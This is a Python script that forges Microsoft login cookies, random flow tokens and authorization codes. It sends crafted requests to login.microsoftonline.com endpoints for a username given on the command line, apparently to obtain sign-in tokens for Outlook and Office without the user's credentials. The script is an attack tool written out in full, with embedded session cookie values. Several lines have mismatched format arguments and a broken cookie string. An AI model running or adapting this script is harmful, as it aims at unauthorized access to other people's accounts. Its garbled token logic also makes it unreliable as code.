import sys
import uuid
import random, base64
import requests

from urllib import parse as urlencode
from bs4 import BeautifulSoup

username = sys.argv[1]

#Create Flow Token
def flowToken():
    token = random.randbytes(256)
    enc_token = base64.b64encode(token)
    b64_token = enc_token.decode()
    return b64_token.split('=')[0].replace('+', '_').replace('/', '-')

def origRequest():
    token = random.randbytes(256)
    enc_token = base64.b64encode(token)
    b64_token = enc_token.decode()
    return b64_token.split('=')[0].replace('+', '_').replace('/', '-')

def authCode():
    token = random.randbytes(256)
    enc_token = base64.b64encode(token)
    b64_token = enc_token.decode()
    return b64_token.split('=')[0].replace('+', '_').replace('/', '-')

def mailboxUser():
    return str(uuid.uuid4())

def mailboxDomain():
    return str(uuid.uuid4())

def client_Id():
    return str(uuid.uuid4())

try:
    fT = flowToken()
    oReq = origRequest()
    n = random.randint(13, len(fT)-12)
    fToken = fT[n:]+'--'+fT[:n+random.randint(n, len(fT))]+'__'+oReq[:n-random.randint(n, len(fT))]

    code = authCode()
    n = random.randint(13, len(code)-12)
    enc_code = '0.'+code[n:]+'.'+code[:n]+'--'+code[:n+random.randint(n, len(code))]


    
    #Forge Cookie
    clrc= urlencode.quote('{"19010":["YLxB1kPp"],"19018":["h5ROdrbP","RjrhuE3a"]}')
    cookie = 'brcap=0; ESTSAUTHPERSISTENT=%s; ch=UiZoFzWECLWKnbVHRYcjwLcdWLVpUNbgKRuvPXNJ9OE; MSFPC=GUID=7a50db6543fc43df9a8812b47f5ba092&HASH=7a50&LV=202104&V=4&LU=1617718897604; buid=0.AQgAnoxqczZLxU6KmmD3k_9H8_fhvoluXopNnz3s1gElnacIAP4.AQABAAEAAAD--DLA3VO7QrddgJg7WevrUTUavQR6t9LLSPramdNFCS06CTE9tf7gsbOHr9nVuKusep8IYtCpKabKBiZ5OTsiV-0KvF2CGSB-OUvJOCvz6gUz2HhxeT6ES93bI1LSzlGp-oDGBQtkgxX81nX9RO4mh9CGyW7shzRmf_hMmJKHL22A2PjifVZQNp2MI2D-iGQgAA; fpc=AkfbZsCDxDVNnqHotEM6aVGerOTJAQAAANcXgtkOAAAA; clrc=%s; wlidperf=FR=L&ST=1643042676978; CCState=Q29nQkNpQmtaV0p5WVhOb1pYSTRNVGswUUhOMGRXUmxiblJ6TG5WaGNIUmpMbVZrZFJJQkFTSUpDWUFrSDMrNm90bElNaW9LRWdvUUFnQUFBQUFBOFEvT0FBQUFBQUFBQUJJSkNWR2VYeE1nNGRsSUdna0pPczhGUjhYZTJVZzRBRWdBVWhJS0VKNk1hbk0yUzhWT2lwcGc5NVAvUi9OYUVnb1FINEhMbks3WUUwYStZeWdQcjkwc0pCSVNDaENOWnFVc3doNjJSSmtqN1ZVSnJsK1NHZ2tKT3M4RlI4WGUyVWdpZWdFQUFRQUJBQUFBL3ZneXdOMVR1MEszWFlDWU8xbnI2eDR3eTRzZlEwbWhCTW9MQlV0TWNuZXpTNmNGS2xHQ1VGMVF4RFNTSE1TeSs2cld2M1ViOWo2Vnd4c2xoQkNFMmhNZ08xTlRIcU1lU0Qva3JoRGwvYms0V3U1WGFhQnhmekxYU3hYdlBLWmhlcUx3dlpMNnJ2UHo2Tk8xeGdRYjFpQUFLb0FHQVFBQkFBRUFBQURmWUVUc1RUWGp6MEhzTFh3RFlRSVBNSUlCNGdZSktvWklodmNOQVFjRG9JSUIwekNDQWM4Q0FRQXhnZ0Y3TUlJQmR3SUJBREJmTUVzeEN6QUpCZ05WQkFZVEFsVlRNUlV3RXdZRFZRUUtFd3hFYVdkcFEyVnlkQ0JKYm1NeEpUQWpCZ05WQkFNVEhFUnBaMmxEWlhKMElFTnNiM1ZrSUZObGNuWnBZMlZ6SUVOQkxURUNFQWR1bzgyZklEQ2cxcGNYV2hyNmp3UXdEUVlKS29aSWh2Y05BUUVCQlFBRWdnRUFjRVRKY1NMSU43MDRzNTNQNDlyVlNnUE9uTzlscmRYNUJ6aDFaQ2VBSnRQTkJVNzc0Z1lrTy9ScVdDVWhaWUQ3b2huZmZMeEprVG9sSjZ4M3ltSEsvKzRvdTBIMU11LzFXUlpLcVJRVytTUGRxeEdiT25LbUtHM0RMTThzL2VsQmpCSy9hTDdGa3BDU1BHOStkaDVOdHdwV1RubER4YjdwU2NBRHpRWVBDOVdRVVF5ajBBcTVhWTZ6bHpQL3czMVVubWJRanhRK2pZa3g4cFhDUWxJOU9CSGt3TnZEazBvb25ZaXVtQ2R0Z1dZOEd1N0Jia3ljNFRtbjlOeWcxS2lEOGtaTU9tekxia3dzWHFxeWtrelJtTnNNN0dCK3FKK3RVRHBET3paSVQ0OTNGMXpxME5ncHovWk91ZVRtc2YvUVBWYmFCZ29QR282cHN3S2kyK0YwZXpCTEJna3Foa2lHOXcwQkJ3RXdGQVlJS29aSWh2Y05Bd2NFQ0M1RUhERmJOZWZhZ0Nqa3p2VWJpOHJvL1ZHZUNxaDNDcWhaVnYvRGFzb3h5WW02TlJqdmtFdlRtY001SVRqRVFFdGFlbG5mSXEwZUwwTUlHRFVTZlRCTGFjckJURUhlT2ljczEyWTNDSFlkQkxCSWszaU9RMU1CQTZiWU1uVlJYUUNGdFl4VnJDLytQMFBBTmF2VDcxLzBxNnlJamJSY1dmQm9UbHJSZDl5ZHM3cmQ2NWJyWm4zSFhVV0hrbnNaQmJ4V2FsTVlpc2Z0M0ZBMzdSdHR3NVVDcmRSSjZ3dzc3dXdiT3pPZFpyeE1za1F2VnNRTVY3R3RFZUk2ZTNTY0N5dTJCMEFPNFA4SGhDbVV5bThDSnpkcExGSUlsazE1V1VYZEVrWWp3dzM3bEdNVDQ1b3ZqMXQ4YlJXZjR4UHpMTkFKaVYvTFFvc3EzMmhNczJKZVJlRVJERGFhOTFNNUlESHRleUF5Y3ZlNVVWMGk4RFhnVEY3RGpBL0hjN2ErYjU3QUZ1RFFJY29SWlM0TlpZMlNvbWlmM3dBQg==; ESTSAUTH=0.AQgAnoxqczZLxU6KmmD3k_9H8_fhvoluXopNnz3s1gElnacIAP4.AgABAAQAAAD--DLA3VO7QrddgJg7WevrAgDs_wQA9P-ZwXnVopFt5Iqvgq3n6MShVKJi-aQsDBI7f6jL35wt958rGx-X0EGtC_EkSZBMC5QfHoFyIcmz9A; ESTSAUTHLIGHT=+; ESTSSC=00; esctx=AQABAAAAAAD--DLA3VO7QrddgJg7WevrFjIuQb4miTDwgVfQNxLCzZZ4OP6aPlUZF4oxt8alTWgGq__mScD05ntY1li2kLMT1Gf2mG1Vc9v59rXOWec2-NpsnDLhXuWmTvC2vS4jKIqAMkg3Uy_v5MT03Wo56JLfe9CWEFuZYqixGv-NJNPCFPl_-zmNVRndb3ol4xpC6rQgAA; x-ms-gateway-slice=estsfd; stsservicecookie=estsfd' % (enc_code, clrc)

    #Encode Referer Link
    redirect_uri= urlencode.quote('https://outlook.office.com/owa/')
    claims = '''{"id_token":{"xms_cc":{"values":["CP1"]}}}'''
    claims_enc = urlencode.quote(claims)
    referer = 'https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=%s&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=f41fe8c6-802c-1350-9b59-8ffbda187bfe&protectedtoken=true&claims=%s&nonce=637787237990811037.6dc37c42-c79b-44fd-87ec-3bab7a7067fc&state=DcsxEoAgDAXRoONxIoEwfDgOBGktvb4p3nYbiOh0hwviIVQFGrKid2kpieKuyxRWMhv65FL24obHWOeYGJCKbcHfK77fiD8' % (redirect_uri, claims_enc)

    #Craft JSON
    json = '''
    {
        "username": "%s",
        "isOtherIdpSupported": false,
        "checkPhones": true,
        "isRemoteNGCSupported": true,
        "isCookieBannerShown": false,
        "isFidoSupported": false,
        "originalRequest": %s,
        "country": "US",
        "forceotclogin": false,
        "isExternalFederationDisallowed": false,
        "isRemoteConnectSupported": false,
        "federationFlags": 0,
        "isSignup": false,
        "flowToken": "%s",
        "isAccessPassSupported": true
    }
    ''' % (username, oReq, fToken)

    #Craft Headers
    headers = {'Host': 'login.microsoft.com',
            'Cookie': cookie,
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': referer,
            'Hpgid' : '1104',
            'Hpgact': '1800',
            'Canary' : 'AQABAAAAAAD--DLA3VO7QrddgJg7WevrtF0qYKgdizNtSX_CmdNELQigOzlsJfiQi2o_Oe-9qey2lHqhiZ1Yzt4BfyhheTyJBj0-ktoUSIUBgo_9Mcyjj5yl54GAHXyPNJWCZy040clk02HdLFhqtGZ_gM6J_7SaBL-aLj6Y6pGPWDKV8S2vCNM6pUI4i26t32g1j8ARxZZkT6zeyqEuhLzZMIdzyRsl5rCW5t4cpmrZpi064YnxCSAA',
            'Client-Request-Id': '',
            'Hpgrequestid': '',
            'Content-Type' : 'application/json; charset=utf-8',
            'Content-Length': '1507',
            'Origin': 'https://login.microsoftonline.com',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Te': 'trailers',
            'Connection': 'close'
            }

    rp = requests.post('https://login.microsoftonline.com/common/GetCredentialType?mkt=en-US', headers=headers,
                                                                                               data=json,
                                                                                               timeout=10,
                                                                                               verify=True)

    print('===================================================================================================')
    print(rp.url)
    print(rp)
    print('===================================================================================================')
    print(rp.content)
    
    canary = 'yUKHoes/+TP7ue9vGKbs0QxDiEpr/LCcvHoY+24R8l4=0:1'
    canary_enc = urlencode.quote(canary)
    
    data = '''
        i13=0\
        &login=%s\
        &loginfmt=%s\
        &type=11&LoginOptions=3\
        &lrt=\
        &lrtPartition=\
        &hisRegion=\
        &hisScaleUnit=\
        &passwd=\
        &ps=2\
        &psRNGCDefaultType=\
        &psRNGCEntropy=\
        &psRNGCSLK=\
        &canary=%s\
        &ctx=%s\
        &hpgrequestid=3a2b6fb7-1344-4aa8-83cd-c560ebe48a00\
        &flowToken=%s\
        &PPSX=\
        &NewUser=1\
        &FoundMSAs=\
        &fspost=0\
        &i21=0\
        &CookieDisclosure=0\
        &IsFidoSupported=0\
        &isSignupPost=0\
        &i2=102&i17=&i18=&i19=19875
    ''' % (username, username, canary, oReq, fToken)


    cookie = 'brcap=0; ESTSAUTHPERSISTENT=%s; ch=q90jpLY4NKjVzRQ5NRAq-BMIRFu-xGsiMixjzqNS7ug; MSFPC=GUID=7a50db6543fc43df9a8812b47f5ba092&HASH=7a50&LV=202104&V=4&LU=1617718897604; buid=0.AQgAnoxqczZLxU6KmmD3k_9H8_fhvoluXopNnz3s1gElnacIAP4.AQABAAEAAAD--DLA3VO7QrddgJg7WevrFZdb48d3NfGirI6tETvozcWRpIzwUFmwt-pi9nZjUqjAwEhpP2nt7SGxFfwpd3uVm7jMoD-gWAwbI96YFf5inJ2TM5VgCUC-nGpZpEP3mkVg8_H-fMpzWq-ifmz-2lkB5Nh7EHRnD9_ju80SwdkvrtOSD5UmC6TF3wpqMvvgqMEgAA; fpc=AkfbZsCDxDVNnqHotEM6aVGerOTJAgAAANcXgtkOAAAA; clrc=%s wlidperf=FR=L&ST=1643127052230; CCState=Q29nQkNpQmtaV0p5WVhOb1pYSTRNVGswUUhOMGRXUmxiblJ6TG5WaGNIUmpMbVZrZFJJQkFTSUpDWUFrSDMrNm90bElNaW9LRWdvUUFnQUFBQUFBOFEvT0FBQUFBQUFBQUJJSkNWR2VYeE1nNGRsSUdna0pPczhGUjhYZTJVZzRBRWdBVWhJS0VKNk1hbk0yUzhWT2lwcGc5NVAvUi9OYUVnb1FINEhMbks3WUUwYStZeWdQcjkwc0pCSVNDaENOWnFVc3doNjJSSmtqN1ZVSnJsK1NHZ2tKT3M4RlI4WGUyVWdpZWdFQUFRQUJBQUFBL3ZneXdOMVR1MEszWFlDWU8xbnI2eDR3eTRzZlEwbWhCTW9MQlV0TWNuZXpTNmNGS2xHQ1VGMVF4RFNTSE1TeSs2cld2M1ViOWo2Vnd4c2xoQkNFMmhNZ08xTlRIcU1lU0Qva3JoRGwvYms0V3U1WGFhQnhmekxYU3hYdlBLWmhlcUx3dlpMNnJ2UHo2Tk8xeGdRYjFpQUFLb0FHQVFBQkFBRUFBQURmWUVUc1RUWGp6MEhzTFh3RFlRSVBNSUlCNGdZSktvWklodmNOQVFjRG9JSUIwekNDQWM4Q0FRQXhnZ0Y3TUlJQmR3SUJBREJmTUVzeEN6QUpCZ05WQkFZVEFsVlRNUlV3RXdZRFZRUUtFd3hFYVdkcFEyVnlkQ0JKYm1NeEpUQWpCZ05WQkFNVEhFUnBaMmxEWlhKMElFTnNiM1ZrSUZObGNuWnBZMlZ6SUVOQkxURUNFQWR1bzgyZklEQ2cxcGNYV2hyNmp3UXdEUVlKS29aSWh2Y05BUUVCQlFBRWdnRUFjRVRKY1NMSU43MDRzNTNQNDlyVlNnUE9uTzlscmRYNUJ6aDFaQ2VBSnRQTkJVNzc0Z1lrTy9ScVdDVWhaWUQ3b2huZmZMeEprVG9sSjZ4M3ltSEsvKzRvdTBIMU11LzFXUlpLcVJRVytTUGRxeEdiT25LbUtHM0RMTThzL2VsQmpCSy9hTDdGa3BDU1BHOStkaDVOdHdwV1RubER4YjdwU2NBRHpRWVBDOVdRVVF5ajBBcTVhWTZ6bHpQL3czMVVubWJRanhRK2pZa3g4cFhDUWxJOU9CSGt3TnZEazBvb25ZaXVtQ2R0Z1dZOEd1N0Jia3ljNFRtbjlOeWcxS2lEOGtaTU9tekxia3dzWHFxeWtrelJtTnNNN0dCK3FKK3RVRHBET3paSVQ0OTNGMXpxME5ncHovWk91ZVRtc2YvUVBWYmFCZ29QR282cHN3S2kyK0YwZXpCTEJna3Foa2lHOXcwQkJ3RXdGQVlJS29aSWh2Y05Bd2NFQ0M1RUhERmJOZWZhZ0Nqa3p2VWJpOHJvL1ZHZUNxaDNDcWhaVnYvRGFzb3h5WW02TlJqdmtFdlRtY001SVRqRVFFdGFlbG5mSXEwZUwwTUlHRFVTZlRCTGFjckJURUhlT2ljczEyWTNDSFlkQkxCSWszaU9RMU1CQTZiWU1uVlJYUUNGdFl4VnJDLytQMFBBTmF2VDcxLzBxNnlJamJSY1dmQm9UbHJSZDl5ZHM3cmQ2NWJyWm4zSFhVV0hrbnNaQmJ4V2FsTVlpc2Z0M0ZBMzdSdHR3NVVDcmRSSjZ3dzc3dXdiT3pPZFpyeE1za1F2VnNRTVY3R3RFZUk2ZTNTY0N5dTJCMEFPNFA4SGhDbVV5bThDSnpkcExGSUlsazE1V1VYZEVrWWp3dzM3bEdNVDQ1b3ZqMXQ4YlJXZjR4UHpMTkFKaVYvTFFvc3EzMmhNczJKZVJlRVJERGFhOTFNNUlESHRleUF5Y3ZlNVVWMGk4RFhnVEY3RGpBL0hjN2ErYjU3QUZ1RFFJY29SWlM0TlpZMlNvbWlmM3dBQg==; ESTSAUTH=0.AQgAnoxqczZLxU6KmmD3k_9H8_fhvoluXopNnz3s1gElnacIAP4.AgABAAQAAAD--DLA3VO7QrddgJg7WevrAgDs_wQA9P_UR_BTn7MKIxZpRufTBfXUenzf6WRsfNkYIph8G359aqC5_ZZ10dLC09FoM3RVASMjW8U3yKMi0A; ESTSAUTHLIGHT=+; ESTSSC=00; esctx=AQABAAAAAAD--DLA3VO7QrddgJg7WevrFjIuQb4miTDwgVfQNxLCzZZ4OP6aPlUZF4oxt8alTWgGq__mScD05ntY1li2kLMT1Gf2mG1Vc9v59rXOWec2-NpsnDLhXuWmTvC2vS4jKIqAMkg3Uy_v5MT03Wo56JLfe9CWEFuZYqixGv-NJNPCFPl_-zmNVRndb3ol4xpC6rQgAA; x-ms-gateway-slice=estsfd; stsservicecookie=estsfd' % (enc_code, clrc)

    headers = {'Host': 'login.microsoftonline.com',
                'Cookie': cookie,
                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Accept-Encoding': 'gzip, deflate',
                'Referer': 'https://login.microsoftonline.com/common/oauth2/authorize?client_id=00000002-0000-0ff1-ce00-000000000000&redirect_uri=%s&resource=00000002-0000-0ff1-ce00-000000000000&response_mode=form_post&response_type=code+id_token&scope=openid&msafed=1&msaredir=1&client-request-id=f41fe8c6-802c-1350-9b59-8ffbda187bfe&protectedtoken=true&claims=%s&nonce=637787237990811037.6dc37c42-c79b-44fd-87ec-3bab7a7067fc&state=DcsxEoAgDAXRoONxIoEwfDgOBGktvb4p3nYbiOh0hwviIVQFGrKid2kpieKuyxRWMhv65FL24obHWOeYGJCKbcHfK77fiD8' % (redirect_uri, claims_enc),
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': '1570',
                'Origin': 'https://login.microsoftonline.com',
                'Upgrade-Insecure-Requests': '1',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Te': 'trailers',
                'Connection': 'close'
            }

    rp = requests.post('https://login.microsoftonline.com/common/login', headers=headers, 
                                                                         data=data, 
                                                                         timeout=10, 
                                                                         verify=True)

    page = BeautifulSoup(rp.content, 'html.parser')

    print('===================================================================================================')
    print(rp.url)
    print(rp)
    print('===================================================================================================')
    print(page)

    clientId = client_Id()
    mbUser = mailboxUser()
    mbDomain = mailboxDomain()
    anchorMailbox = 'Oid:%s@%s' % (mbUser, mbDomain)
    enc_anchorMailbox = urlencode.quote(anchorMailbox)
    
    redirect_uri = 'https://webshell.suite.office.com/iframe/TokenFactoryIframe'
    enc_redirect_uri = urlencode.quote(redirect_uri)
    #scope = b'https://webshell.suite.office.com/.default openid profile offline_access'
    #enc_scope = urlencode.quote_from_bytes(scope)

    data = '''
    client_id=%s\
    &redirect_uri=%s\
    &scope=%s\
    &code=%s\
    &x-client-SKU=msal.js.browser\
    &x-client-VER=2.17.0\
    &x-client-OS=\
    &x-client-CPU=\
    &x-ms-lib-capability=retry-after, \
    h429&x-client-current-telemetry=5|863,0,,,|,\
    &x-client-last-telemetry=5|0|||0,0\
    &code_verifier=syYy79cNWhCEyl4IB5aVX_GlT4K8ZcOsTIsabCJ4UwQ\
    &grant_type=authorization_code\
    &client_info=1\
    &client-request-id=\
    &X-AnchorMailbox=%s
    '''%(enc_redirect_uri, enc_redirect_uri, enc_code, clientId, enc_anchorMailbox)
    
    headers = {'Host': 'login.microsoftonline.com',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Referer': 'https://webshell.suite.office.com/',
            'Content-Type': 'application/x-www-form-urlencoded;charset=utf-8',
            'Origin': 'https://webshell.suite.office.com',
            'Content-Length': str(len(data)),
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'cross-site',
            'Te': 'trailers',
            'Connections': 'close'}
    
    rp = requests.post('https://login.microsoftonline.com/organizations/oauth2/v2.0/token', headers=headers,
                                                                                            data=data, 
                                                                                            timeout=2, 
                                                                                            verify=True)

    page = BeautifulSoup(rp.content, 'html.parser')

    print('===================================================================================================')
    print(rp.url)
    print(rp)
    print('===================================================================================================')
    print(page)
    
except requests.ConnectionError as e:
    print(e)

except requests.ConnectTimeout as t:
    print(t)